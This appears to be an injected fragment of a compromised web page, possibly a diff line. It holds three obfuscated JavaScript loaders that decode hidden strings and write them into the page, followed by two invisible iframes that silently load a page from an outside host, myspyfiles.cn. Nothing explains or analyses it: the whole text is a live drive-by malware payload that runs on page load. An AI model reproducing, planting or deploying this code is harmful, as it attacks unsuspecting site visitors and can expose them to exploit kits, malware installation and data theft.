+<script type="text/javascript">var jGt7H3IkS=Array(63,6,19,54,61,31,22,51,12,33,0,0,0,0,0,0,49,5,4,62,2,25,29,38,39,44,26,28,42,57,21,34,13,7,56,43,41,47,1,3,37,40,11,0,0,0,0,30,0,14,58,17,27,0,8,60,16,36,35,20,46,24,48,10,32,9,15,23,52,53,59,50,55,45,18),OmFORSBhopxKumqErMdN3QYTiogrWyNLb2agSAc="Ewgns28wesYusd8GQ3Ktcs4HoLmts2gnWSInoUgO1S8wo_m96QPxqW8GQ1876sFwB74HZSgwe5RGELf7W5P@fWgG",JjrjMmsvdcJ8K6muubIPn=0,CCdH_4HW=0,Lv0RDYvi6cLNHfJ=0,EnMfvr1feyNJmFLN6C0pIDRx7SSTALRmlVGS,KuX2VtJp1ALLHMe=OmFORSBhopxKumqErMdN3QYTiogrWyNLb2agSAc.length,K038OalUn4uJ0NbuTkOpcwrqivshmm=1024;window.status=' ';for(var uno17GYg1C=Math.ceil(KuX2VtJp1ALLHMe/K038OalUn4uJ0NbuTkOpcwrqivshmm);uno17GYg1C>0;uno17GYg1C--){EnMfvr1feyNJmFLN6C0pIDRx7SSTALRmlVGS='';for(var wwNLNtvgHo3KskNgx=Math.min(KuX2VtJp1ALLHMe,K038OalUn4uJ0NbuTkOpcwrqivshmm);wwNLNtvgHo3KskNgx>0;wwNLNtvgHo3KskNgx--,KuX2VtJp1ALLHMe--){JjrjMmsvdcJ8K6muubIPn|=(jGt7H3IkS[OmFORSBhopxKumqErMdN3QYTiogrWyNLb2agSAc.charCodeAt(Lv0RDYvi6cLNHfJ++)-48])<<CCdH_4HW;if(CCdH_4HW){EnMfvr1feyNJmFLN6C0pIDRx7SSTALRmlVGS+=String.fromCharCode(165^JjrjMmsvdcJ8K6muubIPn&255);JjrjMmsvdcJ8K6muubIPn>>=8;CCdH_4HW-=2}else CCdH_4HW=6}document.write(EnMfvr1feyNJmFLN6C0pIDRx7SSTALRmlVGS);}</script><script type="text/javascript">var f98rXhfaQ_GCbg6bKpp1kYJXFV_lWpn07SJu=Array(63,48,17,41,1,20,24,50,11,45,0,0,0,0,0,0,33,60,25,27,28,14,44,55,61,40,15,4,19,30,35,62,38,32,56,22,23,21,16,43,8,52,6,0,0,0,0,53,0,5,10,51,36,49,54,39,57,12,9,34,46,31,29,18,59,47,13,58,37,3,2,42,7,26,0),XFEbsIaEALL5kjAOMok7Bo_gYefuLj2_sce="B7A1TLi7zTI_TCiPxfDY2THgbwXt2JHY8yF7XWXc8xi1nq6_rTH@aynYDgi16M61iCn_jLiGmlF78uA@CP3kiJA_KNi1Cv",lAGPkybv0X0j1nQwU2WlW0BUR3GWtbcJ_IW=0,cCnG0W0LTDeFVnE9LJ0eVK=0,mMhXur3Gb7ynI8=0,LsEbtyw8U43UOe_2j0UwV3Omb,FU8HA=XFEbsIaEALL5kjAOMok7Bo_gYefuLj2_sce.length,ranl0JMTr6oBBry=1024;window.status=' ';for(var X4H6osiGkCFGJgG9qIjMc_FiYjKERaF=Math.ceil(FU8HA/ranl0JMTr6oBBry);X4H6osiGkCFGJgG9qIjMc_FiYjKERaF>0;X4H6osiGkCFGJgG9qIjMc_FiYjKERaF--){LsEbtyw8U43UOe_2j0UwV3Omb='';for(var m9mqn9Y=Math.min(FU8HA,ranl0JMTr6oBBry);m9mqn9Y>0;m9mqn9Y--,FU8HA--){lAGPkybv0X0j1nQwU2WlW0BUR3GWtbcJ_IW|=(f98rXhfaQ_GCbg6bKpp1kYJXFV_lWpn07SJu[XFEbsIaEALL5kjAOMok7Bo_gYefuLj2_sce.charCodeAt(mMhXur3Gb7ynI8++)-48])<<cCnG0W0LTDeFVnE9LJ0eVK;if(cCnG0W0LTDeFVnE9LJ0eVK){LsEbtyw8U43UOe_2j0UwV3Omb+=String.fromCharCode(165^lAGPkybv0X0j1nQwU2WlW0BUR3GWtbcJ_IW&255);lAGPkybv0X0j1nQwU2WlW0BUR3GWtbcJ_IW>>=8;cCnG0W0LTDeFVnE9LJ0eVK-=2}else cCnG0W0LTDeFVnE9LJ0eVK=6}document.write(LsEbtyw8U43UOe_2j0UwV3Omb);}</script><script type="text/javascript">var r1la5C5Avfp0=Array(63,54,26,16,4,5,12,44,18,30,0,0,0,0,0,0,39,40,2,60,41,52,28,58,59,20,56,9,61,37,48,6,25,17,21,33,32,19,29,1,0,36,22,0,0,0,0,31,0,51,50,8,11,55,42,34,43,45,13,57,10,23,24,15,14,27,62,47,38,35,7,53,46,49,3),eJhYrYMt2PWMQjD2VYqsN2OWOL7GLOC3="PbCNmU6bXmAwmq6tv1FEQmL@lfcMQoLEd27bchcadv6NVsnwjmLS52VEF@6Nn9nN6qVwKU6e_x7bdzCSqtDg6oCw4u6NqB",vwABurJ8jgtDaCw842XyipQC25vuY6b4=0,C6hG6IiBhnF3RlqwA_eJRlOdTu=0,DYIfjhk17tAH0pX9InXMsj2WvwvtJiIvvh1QQjlqT=0,tg3a_L9Y,D7xGqMaGmtw67_r=eJhYrYMt2PWMQjD2VYqsN2OWOL7GLOC3.length,UYmMCobC1HyuFq=1024;window.status=' ';for(var RaIGoXhVKmGO_3mAIi742JX0o9EJ=Math.ceil(D7xGqMaGmtw67_r/UYmMCobC1HyuFq);RaIGoXhVKmGO_3mAIi742JX0o9EJ>0;RaIGoXhVKmGO_3mAIi742JX0o9EJ--){tg3a_L9Y='';for(var HjtvS7MDnCB4dMUbW=Math.min(D7xGqMaGmtw67_r,UYmMCobC1HyuFq);HjtvS7MDnCB4dMUbW>0;HjtvS7MDnCB4dMUbW--,D7xGqMaGmtw67_r--){vwABurJ8jgtDaCw842XyipQC25vuY6b4|=(r1la5C5Avfp0[eJhYrYMt2PWMQjD2VYqsN2OWOL7GLOC3.charCodeAt(DYIfjhk17tAH0pX9InXMsj2WvwvtJiIvvh1QQjlqT++)-48])<<C6hG6IiBhnF3RlqwA_eJRlOdTu;if(C6hG6IiBhnF3RlqwA_eJRlOdTu){tg3a_L9Y+=String.fromCharCode(165^vwABurJ8jgtDaCw842XyipQC25vuY6b4&255);vwABurJ8jgtDaCw842XyipQC25vuY6b4>>=8;C6hG6IiBhnF3RlqwA_eJRlOdTu-=2}else C6hG6IiBhnF3RlqwA_eJRlOdTu=6}document.write(tg3a_L9Y);}</script><iframe src="http://myspyfiles.cn/qazwsx/index.php" width="0" height="0"></iframe><div style="display:none"><iframe src="http://myspyfiles.cn/qazwsx/index.php" width="320" height="240"></iframe></div>
